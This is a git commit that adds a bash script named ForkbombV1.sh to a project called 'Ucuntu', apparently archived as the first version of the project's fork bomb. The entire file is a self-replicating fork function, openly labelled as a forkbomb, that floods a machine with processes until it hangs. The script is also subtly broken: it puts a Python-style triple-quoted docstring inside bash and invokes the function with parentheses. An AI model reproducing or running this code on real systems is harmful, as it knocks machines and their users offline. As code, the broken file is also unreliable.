135243b4aedf17f4274a45651fab72e92b979cde
Sean P. Myrick V19.0.2 <65933340+seanpm2001@users.noreply.github.com>
2020-06-23 12:40:41 -0700

    ForkbombV1.sh
    An archive of the first version of the forkbomb for this project.

---
+++ Ucuntu/ForkbombV1.sh
@@ -0,0 +1,13 @@
+# Start of script
+# Main forkbomb
+fork() {
+    fork | fork &
+}
+fork()
+"""
+File info:
+Line count (including blank lines): 14
+File type: BASH Shell (*.sh)
+Version: 1 (Tuesday, June 22nd 2020 at 12:40 pm)
+"""
+# End of script
